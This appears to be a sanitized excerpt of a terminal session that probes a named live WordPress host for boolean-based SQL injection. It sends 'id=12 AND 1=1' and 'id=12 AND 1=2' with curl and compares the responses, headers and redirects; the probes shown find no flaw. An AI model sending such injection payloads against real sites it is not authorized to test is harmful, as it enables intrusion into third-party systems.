@@ -1,0 +1,58 @@
+SANITIZED EXCERPT — not the full terminal transcript.
+Original line numbers retained. Shell identity removed; full HTML and browser-cookie command omitted.
+
+6: $ curl -sS -G 'https://kaviarasank64.sg-host.com/products' \
+7:   --data-urlencode 'id=12' \
+8:   -o baseline.html \
+9:   -w 'Status: %{http_code} | Bytes: %{size_download} | Time: %{time_total}s\n'
+10: Status: 404 | Bytes: 287865 | Time: 1.977251s
+11: $ curl -sS -G 'https://kaviarasank64.sg-host.com' \
+12:   --data-urlencode 'id=12' \
+13:   -o baseline.html \
+14:   -w 'Status: %{http_code} | Bytes: %{size_download} | Time: %{time_total}s\n'
+15: Status: 200 | Bytes: 516062 | Time: 1.514481s
+16: $ curl -sS -G 'https://kaviarasank64.sg-host.com' \
+17:   --data-urlencode 'id=12 AND 1=1' \
+18:   -o true.html \
+19:   -w 'Status: %{http_code} | Bytes: %{size_download} | Time: %{time_total}s\n'
+20: Status: 301 | Bytes: 0 | Time: 1.141172s
+21: $ curl -sS -G 'https://kaviarasank64.sg-host.com' \
+22:   --data-urlencode 'id=12 AND 1=2' \
+23:   -o false.html \
+24:   -w 'Status: %{http_code} | Bytes: %{size_download} | Time: %{time_total}s\n'
+25: Status: 301 | Bytes: 0 | Time: 1.132805s
+26: $ diff -u baseline.html true.html
+27: diff -u true.html false.html
+28: --- baseline.html	2026-11-10 11:40:48
+29: +++ true.html	2026-11-10 11:41:33
+30: @@ -1,4837 +0,0 @@
+4869: $ curl -sS -G 'https://kaviarasank64.sg-host.com/' \
+4870:   --data-urlencode 'id=12 AND 1=1' \
+4871:   -D - \
+4872:   -o /dev/null
+4873: HTTP/2 301
+4874: server: nginx
+4875: date: Tue, 10 Nov 2026 11:45:58 GMT
+4876: content-type: text/html; charset=UTF-8
+4877: content-length: 0
+4878: location: https://kaviarasank64.sg-host.com/?id=12%20AND%201%3D1
+4879: x-cache-enabled: False
+4880: x-content-type-options: nosniff
+4881: x-xss-protection: 1; mode=block
+4882: x-ua-compatible: IE=edge
+4883: cache-control: no-cache, must-revalidate, max-age=0, no-store, private
+4884: x-redirect-by: WordPress
+4885: x-httpd-modphp: 1
+4886: host-header: 6b7412fb82ca5edfd0917e3957f05d89
+4887: x-proxy-cache: MISS
+4888: x-proxy-cache-info: W301 NC:000000 UP:
+4889:
+4890: $ curl -sS -L --max-redirs 5 \
+4891:   -G 'https://kaviarasank64.sg-host.com/' \
+4892:   --data-urlencode 'id=12 AND 1=1' \
+4893:   -o followed.html \
+4894:   -w 'Final status: %{http_code}\nFinal URL: %{url_effective}\nRedirects: %{num_redirects}\nBytes: %{size_download}\n'
+4895: Final status: 200
+4896: Final URL: https://kaviarasank64.sg-host.com/?id=12%20AND%201%3D1
+4897: Redirects: 1
+4898: Bytes: 516138
